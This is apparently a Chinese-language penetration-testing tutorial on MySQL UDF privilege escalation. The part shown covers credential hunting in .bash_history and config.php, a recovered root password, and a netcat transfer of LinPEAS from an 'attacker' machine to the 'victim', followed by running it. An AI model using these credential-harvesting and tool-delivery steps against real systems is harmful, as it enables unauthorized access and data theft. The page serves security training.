<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536301-1261266786-537abd0d25529880c3c2800ef435438a.png" width="615" height="49" class="img_ev3q"></p>
<p>从这个输出中，我们最感兴趣的是“Distrib”编号，在本例中为<strong>5.7.34</strong>，这对我们来说是个好消息，因为我们将使用的 UDF 漏洞适用于 MySQL / MariaDB 版本 4.X 和 5.X 。</p>
<blockquote>
<p>这个漏洞涵盖多个版本的 MySQL，因为它针对的不是传统意义上的漏洞。UDF 是一种预期功能，旨在允许从 MySQL 内部读/写宿主机文件系统；然而，当 MySQL 服务/进程被错误配置（以root运行进程）或修改为允许过多访问（可在外部登录访问）或 &quot;松散权限 &quot;时，我们就会发现自己处于可以利用此服务并提升访问权限的位置。</p>
</blockquote>
<p>接下来，我们需要找到一种访问数据库的方法。为此，我们需要找到允许我们登入的凭据。</p>
<p>默认情况下，MySQL 服务器的 root 密码为<strong>空</strong>，因此我们首先应该尝试不使用密码登录，看看是否是这种情况。我们可以尝试使用以下命令以 root 身份登录：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql -u root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这要么让我们直接进入，要么告诉我们由于未提供密码而导致访问被拒绝。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183535990-921088929-cc213f9ba265ac38989947f5ea1c1249.png" width="675" height="52" class="img_ev3q"></p>
<p>在这里我们可以看到root帐户确实需要密码。</p>
<blockquote>
<p>在此需要明确的一点是，MySQL 的 &quot;root&quot; 账户只是 MySQL 服务的超级用户账户，这与文件系统上的 root 账户不同。</p>
</blockquote>
<p>接下来，我们应该尝试另一个常见的默认密码，即 toor 。为了提示我们输入密码，我们需要将“-p”标志传递到 mysql 命令中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql -u root -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536534-631833805-a76c1a67c4b736c317c30d55312f3db6.png" width="684" height="61" class="img_ev3q"></p>
<p>在提示输入密码后，我们输入了 &quot;toor&quot;，但也无法进入！这意味着我们需要开始寻找密码，希望能找到根密码。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="211寻找数据库凭证"><strong><div id="id2.1.1">2.1.1、寻找数据库凭证</div></strong><a href="#211寻找数据库凭证" class="hash-link" aria-label="211寻找数据库凭证的直接链接" title="211寻找数据库凭证的直接链接">​</a></h6>
<p>我们可以在文件系统的许多地方查找凭据。我们在初始枚举和后枚举过程中发现的任何用户名和/或密码都应放入记事本中，这样我们就可以在任何地方尝试插入这些用户名和密码。</p>
<p>此外，还有一些特定的地方我们最有可能找到 MySQL 凭据。</p>
<p>首先，我们应该始终检查当前用户主目录中的 <strong>.bash_history</strong> 文件，以及我们有权访问的任何其他用户主目录。这应该是我们进行漏洞挖掘后的首要步骤之一，因为它可以让我们快速、轻松地获胜。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /home &amp;&amp; ls -l</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536103-1228974095-560d73434d99673d1b6476ffa32d0211.png" width="532" height="63" class="img_ev3q"></p>
<p>在这里我们可以看到 /home 目录中只有一个用户目录，因此我们将从这里开始。</p>
<blockquote>
<p>如果此处有多个用户目录，请尝试访问所有目录。您永远不知道您可能会发现您有权访问什么...例如，另一个用户的 bash 历史文件！请注意，我们在这里没有看到 root 的主配置文件，因为 root 主配置文件位于 /root。另外请注意，bash 历史记录文件是隐藏的， 可以使用 <strong>ls -la</strong> 查看</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd juggernaut &amp;&amp; cat .bash_history</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536510-1537199639-3cf869bc977040d5267b4d7480019dcc.png" width="606" height="308" class="img_ev3q"></p>
<p>BOOM！在 bash 历史文件中，我们可以看到用户尝试直接在命令行上传递完整凭据来登录 MySQL。</p>
<p><strong>root：SuperS3cureP@ssw0rd</strong></p>
<p>我们通常会找到 MySQL 凭据的第二个地方是 webroot 目录。它通常位于 <strong>/var/www</strong>，该目录还包含我们在获得立足点之前使用 gobuster 或 dirb 等工具对子目录进行模糊测试时找到的网页。</p>
<p>大多数情况下，我们会寻找配置 PHP 文件。但是，我们也可以在许多可能的文件类型中找到数据库凭据，包括 TXT 文件、bash 脚本、其他脚本、ZIP 文件、其他压缩文件类型（tar、gz 等）、DB 文件等等。</p>
<p>导航到 /var/www/，我们可以看到这里有一些文件，但“config.php”最为突出。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /var/www &amp;&amp; ls -l</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536396-504197225-1ef1a9717921320bcbd0cf44707a77b0.png" width="519" height="140" class="img_ev3q"></p>
<p>当我们检查该文件时，我们可以看到它用于以 root 身份访问 MySQL 数据库，并显示明文用户名和密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536361-536169106-699d0c63346406a73e19bd7ae2fca76f.png" width="445" height="382" class="img_ev3q"></p>
<p>现在我们有了用户名和密码，我们可以在受害机器上本地访问数据库；不过，在此之前，让我们看看 LinPEAS 是如何自动枚举我们刚刚找到的所有内容。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22工具枚举-udf-漏洞利用条件"><strong><div id="id2.2">2.2、工具枚举 UDF 漏洞利用条件</div></strong><a href="#22工具枚举-udf-漏洞利用条件" class="hash-link" aria-label="22工具枚举-udf-漏洞利用条件的直接链接" title="22工具枚举-udf-漏洞利用条件的直接链接">​</a></h2>
<p>LinPEAS 是一款终极的后漏洞枚举工具，因为它提供了大量信息。在受害者上运行它后，我们将看到通过手动枚举发现的所有相同内容，甚至更多。然而，在使用工具之前展示手动步骤非常重要，这样我们才能理解输出结果以及要查找的内容。</p>
<blockquote>
<p>如果您没有 LinPEAS 的副本，您可以<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">在这里</a>获取一份。</p>
</blockquote>
<p>一般来说，当我们执行 LinPEAS 时，我们将不带参数运行以进行“所有检查”，然后从上到下逐行梳理所有输出。</p>
<blockquote>
<p>运行完整扫描时的一个好技巧是将 PEAS 的输出重定向到一个文件，以便使用 <strong>grep</strong> 快速解析常见漏洞和关键字。</p>
</blockquote>
<p>获取 LinPEAS 的副本后，我们需要将副本传输给受害者。我们可以通过多种方式来完成此操作，但在本示例中，我们将使用 netcat。</p>
<p>从 linpeas.sh 所在的目录中，我们可以在攻击者计算机上运行以下命令，将文件提供给受害者：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc -nvlp 443 &lt; linpeas.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>回到受害者，我们需要导航到具有写入权限的文件夹，通常是我们的 home 目录、/tmp 目录或 /dev/shm 目录。我个人喜欢 /dev/shm，因此我们将导航到那里，然后使用以下命令下载 LinPEAS：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /dev/shm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nc 172.16.1.30 443 &gt; linpeas.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当正确完成此操作后，我们应该看到受害者签入到我们的攻击者机器，并且两个提示都会挂起。让它静置一分钟，然后终止攻击者计算机上的提示，这样它就不会终止受害者上的 shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536145-18201465-86479475d404c6656c052cd9c91a7e15.png" width="517" height="81" class="img_ev3q"></p>
<p>在这里我们可以看到受害者 - 172.16.1.175，登录到了我们的攻击者机器 - 172.16.1.30。大约一分钟后，我们可以简单地使用<strong>CTRL + C</strong> 来终止攻击者计算机上的会话，并再次释放受害者的提示。之后，我们需要使用 <strong>ls -l</strong> 检查两侧的文件，确保它们的大小相同（完整性完好），这将表明传输成功。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536310-5243497-9230005a0790df2aed2f5403ff90dc8c.png" width="500" height="146" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536356-1670306426-cdc510e653ca34666c2d91587631ceac.png" width="581" height="68" class="img_ev3q"></p>
<p>完美，一切都匹配！现在我们需要使用 <strong>chmod + x</strong> 或 <strong>chmod 755</strong> 授予文件执行权限。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183535974-2030764566-d93e01b4926b9a66d011768101e544be.png" width="543" height="65" class="img_ev3q"></p>
<p>好吧，剩下要做的就是执行脚本，然后查看输出。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./linpeas.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>向下滚动，我们发现第一个必要条件是 MySQL 进程在<strong>Processes、Crons、Timers、Services and Sockets</strong> 部分中以 root 身份运行。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183537478-1448761821-c2fb94c5e30a7ea3c42ece21870a4172.png" width="1024" height="229" class="img_ev3q"></p>
<p>进一步滚动，我们来到 <strong>Software Information</strong> 部分，在这里我们可以看到正在运行的 MySQL 版本以及 LinPEAS 执行的一些检查，以查看 root 帐户是否使用空白密码或“root”或“toor”作为密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536308-187808213-899030c640075c4da2118e51afea07c4.png" width="676" height="334" class="img_ev3q"></p>
<p>继续，我们到达 <strong>Interesting Files</strong> 部分，我们在其中找到 Web 文件，其中 <strong>config.php</strong> 脱颖而出。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536766-1398652402-a4680b0bec922fd90fd14823ac94d69f.png" width="532" height="199" class="img_ev3q"></p>
<p>再往下，我们遇到了有趣的历史文件字符串，并且发现了 MySQL 凭据，就像我们在 .bash_history 文件中所做的那样。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536211-546418228-e0147c1ee29e2be9501757484ede63a7.png" width="589" height="251" class="img_ev3q"></p>
<p>再往下一点，我们可以看到 LinPEAS 发现 config.php 文件很有趣，并专门为此设置了一个检查，在本例中，它恰好为我们转储了凭据！</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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